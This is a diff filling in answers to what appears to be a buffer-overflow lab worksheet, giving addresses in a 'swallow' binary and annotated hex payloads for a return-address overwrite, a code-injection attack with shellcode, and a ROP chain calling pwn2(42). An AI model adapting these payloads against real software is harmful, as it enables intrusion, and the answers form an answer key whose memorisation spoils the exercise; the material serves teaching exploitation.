@@ -1,33 +1,57 @@
 Q. At what address (hex) is pwn1 when swallow is running?
 
-
+0x4017b5
 
 Q. At what address (hex) is pwn2 when swallow is running?
 
-
+0x4017da
 
 Q. At what address (hex) is speed when the main212() function inside swallow is running?
 
-
+0x7fffffe7fa60
 
 Q. At what address (hex) is the return address when main212() inside swallow is running?
 
+0x7fffffe7ffe8
 
 
 Q. At what address (hex) is the sequence of instructions "cmp rdx, rdi", "setae al", "ret" found when swallow is running?
+0x41a821
 
 
 
 Q. Your analysis of flight1 below
-
+Summary - Jump to function attack, invokes pwn1
+62 6f 6e 65 73 20 6f 66  - padding to fill buff (8b)
+20 66 75 6c 6c 20 66 69  - padding to fill buff (8b)
+66 74 79 20 6d 65 6e 20  - padding to fill buff (8b)
+6c 69 65 20 73 74 72 65  - padding to fill buff (8b) total 32b
+77 6e 20 61 62 6f 75 74  - extra padding to fill empty space on the stack created sub rsp function. 
+b5 17 40 00 00 00 00 00  - address of pwn function
 
 
 
 Q. Your analysis of flight2 below
-
+Summary - Code injection attack, invokes  pwn2(212)
+bf d4 00 00 00 b8 da 17 - mov edi, 0xd4 -> mov eax, 0x4017da -> jmp rax (jumps to pwn2)
+40 00 ff e0 61 20 73 63 - padding to fill buff, starts 61
+72 61 74 63 68 21 3f 20 - padding to fill buff (8b)
+20 79 6f 75 72 20 61 72 - padding to fill buff (8b)
+6d 27 73 20 6f 66 66 21 - padding to fill buff (8b)
+c0 ff e7 ff ff 7f 00 00 - address to the injected code in Line 1
 
 
 Q. Your analysis of flight3 below
+Summary - ROP attack , invokes PWN2(42)
+62 6f 6e 65 73 20 6f 66 - padding to fill buff
+20 66 75 6c 6c 20 66 69 - padding to fill buff
+66 74 79 20 6d 65 6e 20 - padding to fill buff
+6c 69 65 20 73 74 72 65 - padding to fill buff
+77 6e 20 61 62 6f 75 74 - padding to fill stack empty space
+94 19 40 00 00 00 00 00 - address to gadget pop rdi
+2a 00 00 00 00 00 00 00 - desired rdi
+da 17 40 00 00 00 00 00 - address to pwn2
+
 
 
 
